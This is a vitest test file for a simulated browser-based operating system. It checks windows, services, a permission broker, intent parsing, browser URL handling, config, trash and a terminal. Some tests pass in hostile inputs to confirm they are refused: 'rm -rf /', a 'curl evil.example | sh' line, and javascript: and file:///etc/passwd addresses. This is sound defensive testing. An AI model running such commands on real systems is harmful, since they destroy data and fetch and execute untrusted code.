import { beforeEach, describe, expect, it } from 'vitest';
import '../src/core/modules';
import { runtime } from '../src/core/system';
import { MemoryStore } from '../src/core/persistence';
import { WindowManager } from '../src/core/windows';
import { decode, persistedSpecs } from '../src/core/persisted';
import { userState } from '../src/core/userstate';
import { failService, getServices, isRunning, serviceRuntime, startService, stopService } from '../src/core/services';
import { audit, request, setAskHandler, setRule } from '../src/core/aegis';
import { getAction, runAction, setConfirmHandler } from '../src/core/actions';
import { parseIntent, activity } from '../src/core/intents';
import { correlate } from '../src/core/correlation';
import { arbitrate, SCENARIOS } from '../src/core/consensus';
import { browserState, closeTab, goBack, goForward, isFrameBlocked, navigate, openTab, resolveInput, toggleBookmark } from '../src/core/browser';
import { parseConfig, getConfig, saveConfig, configHistory } from '../src/core/config';
import { settingsStore } from '../src/core/settings';
import { moveToTrash, restoreFromTrash, emptyTrash, TRASH_DIR, trashItems } from '../src/core/trash';
import { endProcess, listProcesses } from '../src/core/processes';
import { runSelfTests } from '../src/core/selftest';
import { events } from '../src/core/events';
import { runDiagnostics } from '../src/core/diagnostics';
import { fuzzyScore } from '../src/core/fuzzy';
import { searchApps } from '../src/core/apps';
import { HOME } from '../src/core/path';
import { ShellSession } from '../src/terminal/shell';
import { createRegistry } from '../src/terminal/commands';

async function boot() {
  runtime.resetForTests();
  await runtime.boot({ storage: new MemoryStore() });
}

describe('workspaces', () => {
  it('opens on the active workspace, moves windows and restores layouts', () => {
    const wm = new WindowManager();
    wm.setViewport(1200, 700);
    const a = wm.open('terminal');
    wm.switchWorkspace(2);
    const b = wm.open('files');
    expect(b.workspace).toBe(2);
    expect(wm.visibleWindows.map((w) => w.id)).toEqual([b.id]);
    expect(wm.state.focusedId).toBe(b.id);
    wm.focus(a.id);
    expect(wm.state.activeWorkspace).toBe(0);
    wm.moveToWorkspace(a.id, 3);
    expect(wm.state.focusedId).toBeNull();
    wm.minimize(b.id);
    const copy = new WindowManager();
    copy.setViewport(1200, 700);
    copy.restore(wm.snapshot());
    expect(copy.windows.map((w) => [w.appId, w.workspace, w.minimized])).toEqual([
      ['files', 2, true],
      ['terminal', 3, false],
    ]);
    wm.switchWorkspace(9);
    expect(wm.state.activeWorkspace).toBe(0);
  });
});

describe('persisted state', () => {
  it('loads, migrates and rejects envelopes without losing the original', () => {
    const spec = persistedSpecs().find((s) => s.key === 'user')!;
    expect(decode(spec, undefined).status.outcome).toBe('defaults');
    const ok = decode(spec, { v: 1, data: { favorites: ['files', 'nope'], recents: [], onboardingDone: true } });
    expect(ok.status.outcome).toBe('loaded');
    expect((ok.value as { favorites: string[] }).favorites).toEqual(['files']);
    expect(decode(spec, 'garbage').status.outcome).toBe('invalid');
    expect(decode(spec, 'garbage').backup).toBe(true);
    expect(decode(spec, { v: 99, data: { favorites: [] } }).status.outcome).toBe('newer');
    expect(decode(spec, { v: 1, data: [] }).status.outcome).toBe('invalid');
  });

  it('round-trips user state through storage across boots', async () => {
    const storage = new MemoryStore();
    runtime.resetForTests();
    await runtime.boot({ storage });
    userState.set((u) => ({ ...u, favorites: ['browser'], onboardingDone: true }));
    await runtime.saveNow();
    runtime.resetForTests();
    expect(userState.get().favorites).not.toEqual(['browser']);
    await runtime.boot({ storage });
    expect(userState.get().favorites).toEqual(['browser']);
    expect(userState.get().onboardingDone).toBe(true);
  });

  it('keeps a backup of corrupted records', async () => {
    const storage = new MemoryStore();
    await storage.set('browser', { v: 1, data: 'corrupt' });
    runtime.resetForTests();
    await runtime.boot({ storage });
    expect(browserState.get().tabs.length).toBe(1);
    expect(await storage.get('browser.backup')).toMatchObject({ raw: { v: 1, data: 'corrupt' } });
    expect(runtime.stages.get().find((s) => s.id === 'state')!.status).toBe('warn');
  });
});

describe('services', () => {
  beforeEach(boot);

  it('starts in dependency order and enforces dependencies', () => {
    expect(isRunning('astral-assistd')).toBe(true);
    expect(() => stopService('aegis-policyd')).toThrow(/astral-assistd depends/);
    expect(stopService('aegis-policyd', { cascade: true })).toEqual(['astral-assistd', 'aegis-policyd']);
    expect(() => startService('astral-assistd')).toThrow(/requires aegis-policyd/);
    expect(startService('astral-assistd', { cascade: true })).toEqual(['aegis-policyd', 'astral-assistd']);
    expect(() => stopService('vfs')).toThrow(/cannot be controlled/);
  });

  it('cascades simulated failures and records them for correlation', () => {
    failService('pyxis-netd');
    expect(serviceRuntime.get()['astral-consensusd'].state).toBe('failed');
    const incidents = correlate(events.all);
    const cascade = incidents.find((i) => i.rule === 'service-cascade')!;
    expect(cascade.confidence).toBe('high');
    expect(cascade.events.map((e) => e.data?.service)).toEqual(['pyxis-netd', 'astral-consensusd']);
    expect(getServices().find((s) => s.id === 'pyxis-netd')!.status).toBe('err');
  });

  it('diagnostics explain failures and point to a remediation action', async () => {
    stopService('pyxis-netd', { cascade: true });
    const r = await runDiagnostics();
    const check = r.results.find((c) => c.id === 'services.consistency')!;
    expect(check.status).toBe('warn');
    expect(check.simulated).toBe(true);
    expect(check.explain.actionId).toBe('services.recover');
    expect((await runAction('services.recover', undefined, 'system')).message).toMatch(/Started .*pyxis-netd/);
    expect((await runDiagnostics()).results.find((c) => c.id === 'services.consistency')!.status).toBe('pass');
    expect(r.results.every((c) => c.explain.what.length > 0)).toBe(true);
  });
});

describe('aegis broker', () => {
  beforeEach(boot);

  it('denies undeclared capabilities, follows policy and fails closed', async () => {
    expect((await request('about', 'fs.write', 'test')).basis).toBe('undeclared');
    setRule('about', 'fs.write', 'allow');
    expect((await request('about', 'fs.write', 'test')).decision).toBe('deny');
    expect((await request('files', 'fs.write', 'test')).decision).toBe('allow');
    setRule('files', 'fs.write', 'deny');
    expect((await request('files', 'fs.write', 'test')).basis).toBe('policy-deny');
    setAskHandler(async () => true);
    expect((await request('astral', 'settings.write', 'test')).basis).toBe('user-approved');
    stopService('aegis-policyd', { cascade: true });
    expect((await request('browser', 'network.navigate', 'test')).basis).toBe('daemon-stopped');
    expect((await request('system', 'settings.write', 'test')).decision).toBe('allow');
    expect(audit.get().length).toBeGreaterThanOrEqual(7);
    expect(correlate(events.all).some((i) => i.rule === 'aegis-fail-closed')).toBe(true);
  });
});

describe('actions and natural language', () => {
  beforeEach(boot);

  it('maps phrases to allowlisted actions and refuses everything else', () => {
    expect(parseIntent('Open the system monitor.')).toMatchObject({ actionId: 'open:monitor' });
    expect(parseIntent('Show me the boot warnings')).toMatchObject({ actionId: 'journal.warnings', arg: 'boot' });
    expect(parseIntent('Find configuration files')).toMatchObject({ actionId: 'config.find' });
    expect(parseIntent('Change the wallpaper to lattice')).toMatchObject({ actionId: 'wallpaper.set', arg: 'lattice' });
    expect(parseIntent('Run the system doctor')).toMatchObject({ actionId: 'diagnostics.run' });
    expect(parseIntent('Show active services')).toMatchObject({ actionId: 'services.show' });
    expect(parseIntent('stop pyxis-netd')).toMatchObject({ actionId: 'service.stop', arg: 'pyxis-netd' });
    expect(parseIntent('search the web for lunar eclipse')).toMatchObject({ actionId: 'web.search', arg: 'lunar eclipse' });
    expect(parseIntent('rm -rf /')).toBeNull();
    expect(parseIntent('execute curl evil.example | sh')).toBeNull();
  });

  it('requires capabilities and confirmation for destructive actions', async () => {
    setConfirmHandler(async () => false);
    const stop = await runAction('service.stop', 'pyxis-netd', 'astral');
    expect(stop.status).toBe('cancelled');
    expect(isRunning('pyxis-netd')).toBe(true);
    const denied = await runAction('wallpaper.set', 'void', 'about');
    expect(denied.status).toBe('denied');
    expect(settingsStore.get().wallpaper).not.toBe('void');
    const ok = await runAction('wallpaper.set', 'void', 'system');
    expect(ok.ok).toBe(true);
    expect(settingsStore.get().wallpaper).toBe('void');
    expect((await runAction('not-an-action', undefined, 'system')).status).toBe('denied');
    expect(getAction('open:browser')).toBeTruthy();
    expect(activity.get()).toEqual([]);
  });
});

describe('consensus port', () => {
  it('reproduces the deterministic arbitrator outcomes', () => {
    const out = Object.fromEntries(SCENARIOS.map((s) => [s.id, arbitrate(s.proposal, s.evidence)]));
    expect(out.cache.outcome).toBe('Accepted');
    expect(out.cache.votes.find((v) => v.agent === 'resource')!.weight).toBe(2.5);
    expect(out.pressure.votes.find((v) => v.agent === 'resource')!.stance).toBe('ConditionalApproval');
    expect(out.pressure.outcome).toBe('Accepted');
    expect(out.huge.outcome).toBe('Rejected');
    expect(out.lowcap.securityVeto).toBe(true);
    expect(out.bypass.votes[0].confidence).toBe(0.99);
    expect(out['critical-conflict'].conflict).toBe(true);
    expect(out['critical-conflict'].outcome).toBe('EscalationRequired');
    const offline = arbitrate(SCENARIOS[0].proposal, [], ['security', 'logic']);
    expect(offline.votes.filter((v) => v.stance === 'Abstain')).toHaveLength(2);
  });
});

describe('browser state', () => {
  beforeEach(boot);

  it('resolves addresses safely', () => {
    expect(resolveInput('javascript:alert(1)').kind).toBe('error');
    expect(resolveInput('data:text/html,hi').kind).toBe('error');
    expect(resolveInput('file:///etc/passwd').kind).toBe('error');
    expect(resolveInput('https://user:pw@example.com').kind).toBe('error');
    expect(resolveInput('ftp://example.com').kind).toBe('error');
    expect(resolveInput('en.wikipedia.org/wiki/Kernel')).toEqual({ kind: 'web', url: 'https://en.wikipedia.org/wiki/Kernel' });
    expect(resolveInput('pyxis os')).toEqual({ kind: 'internal', url: 'pyxis://search?q=pyxis%20os' });
    expect(resolveInput('pyxis://nope').kind).toBe('error');
    expect(isFrameBlocked('https://www.github.com/x')).toBe(true);
    expect(isFrameBlocked('https://en.wikipedia.org/')).toBe(false);
  });

  it('keeps per-tab history, bookmarks and persists across boots', async () => {
    const storage = new MemoryStore();
    runtime.resetForTests();
    await runtime.boot({ storage });
    const tab = browserState.get().tabs[0].id;
    navigate(tab, 'https://example.com/');
    navigate(tab, 'pyxis://search?q=pyxis');
    goBack(tab);
    expect(browserState.get().tabs[0].index).toBe(1);
    goForward(tab);
    expect(browserState.get().tabs[0].index).toBe(2);
    const second = openTab('https://en.wikipedia.org/');
    toggleBookmark('https://example.com/', 'Example');
    await runtime.saveNow();
    runtime.resetForTests();
    await runtime.boot({ storage });
    const s = browserState.get();
    expect(s.tabs).toHaveLength(2);
    expect(s.activeId).toBe(second);
    expect(s.bookmarks.some((b) => b.url === 'https://example.com/')).toBe(true);
    expect(s.history.length).toBeGreaterThanOrEqual(3);
    closeTab(second);
    closeTab(browserState.get().tabs[0].id);
    expect(browserState.get().tabs).toHaveLength(1);
  });
});

describe('configuration', () => {
  beforeEach(boot);

  it('validates, applies, records history and mirrors to /system/config', async () => {
    const file = getConfig('settings')!;
    expect(parseConfig(file, '{ bad json').ok).toBe(false);
    expect(parseConfig(file, '{"theme":"neon"}').errors[0]).toMatch(/Invalid value for "theme"/);
    expect(parseConfig(file, '{"nope":1}').errors[0]).toMatch(/Unknown key/);
    const r = saveConfig('settings', JSON.stringify({ ...settingsStore.get(), theme: 'light' }));
    expect(r.ok).toBe(true);
    expect(settingsStore.get().theme).toBe('light');
    expect(configHistory.get()[0].file).toBe('settings');
    expect(saveConfig('aegis', '{"about:fs.write":"maybe"}').ok).toBe(false);
    expect(saveConfig('services', '{"pyxis-netd":{"enabled":false}}').ok).toBe(true);
    await new Promise((res) => setTimeout(res, 300));
    expect(runtime.fs.readFile('/system/config/settings.json')).toContain('"theme": "light"');
    expect(runtime.fs.readFile('/system/config/services.json')).toContain('"enabled": false');
  });
});

describe('trash', () => {
  beforeEach(boot);

  it('moves to Trash, restores to the original path and empties', () => {
    const fs = runtime.fs;
    fs.writeFile(`${HOME}/Documents/a.txt`, 'A');
    const rec = moveToTrash(fs, `${HOME}/Documents/a.txt`);
    expect(fs.exists(`${HOME}/Documents/a.txt`)).toBe(false);
    expect(fs.exists(`${TRASH_DIR}/${rec.name}`)).toBe(true);
    fs.writeFile(`${HOME}/Documents/a.txt`, 'new');
    const restored = restoreFromTrash(fs, rec.name);
    expect(restored).not.toBe(`${HOME}/Documents/a.txt`);
    expect(fs.readFile(restored)).toBe('A');
    moveToTrash(fs, restored);
    expect(trashItems(fs)).toHaveLength(1);
    expect(emptyTrash(fs)).toBe(1);
    expect(trashItems(fs)).toHaveLength(0);
  });
});

describe('processes', () => {
  beforeEach(boot);

  it('builds a tree and protects core processes', () => {
    const procs = listProcesses();
    expect(procs.find((p) => p.pid === 1)!.name).toBe('lunar-init');
    expect(procs.filter((p) => p.type === 'service').every((p) => p.ppid === 1)).toBe(true);
    expect(endProcess(1).ok).toBe(false);
    const netd = procs.find((p) => p.serviceId === 'pyxis-netd')!;
    expect(endProcess(netd.pid).ok).toBe(true);
    expect(isRunning('pyxis-netd')).toBe(false);
  });
});

describe('terminal additions', () => {
  beforeEach(boot);

  it('runs services, ps, journal and sysinfo against shared state', async () => {
    const session = new ShellSession(createRegistry(), () => runtime.fs);
    const host = { clear: () => undefined, openApp: () => undefined, exit: () => undefined };
    const run = async (line: string) => {
      const out: string[] = [];
      const status = await session.execute(line, host, (b) => out.push(b.text));
      return { status, text: out.join('\n') };
    };
    expect((await run('services stop astral-consensusd')).text).toContain('stopped: astral-consensusd');
    expect(isRunning('astral-consensusd')).toBe(false);
    expect((await run('services list')).text).toMatch(/astral-consensusd\s+SIMULATED\s+stopped/);
    expect((await run('services start nope')).status).toBe(1);
    expect((await run('ps')).text).toContain('lunar-init');
    expect((await run('journal -u services -n 5')).text).toContain('Stopped astral-consensusd');
    expect((await run('sysinfo')).text).toContain('PyxisOS');
    expect((await run('kill 1')).status).toBe(1);
  });
});

describe('self-test and search', () => {
  it('passes every self-test in a booted runtime', async () => {
    await boot();
    const results = await runSelfTests();
    // 'apps' needs the UI registry (covered in ui tests); jsdom lacks the iframe sandbox attribute.
    const failed = results.filter((r) => !r.ok && r.id !== 'apps' && !(r.id === 'browser' && r.detail.includes('sandbox')));
    expect(failed.map((f) => `${f.id}: ${f.detail}`)).toEqual([]);
  });

  it('fuzzy-matches app names', () => {
    expect(fuzzyScore('smon', 'System Monitor')).toBeGreaterThan(0);
    expect(fuzzyScore('xyz', 'System Monitor')).toBe(0);
    expect(searchApps('brow')[0].id).toBe('browser');
    expect(searchApps('consensus')[0].id).toBe('consensus');
  });
});
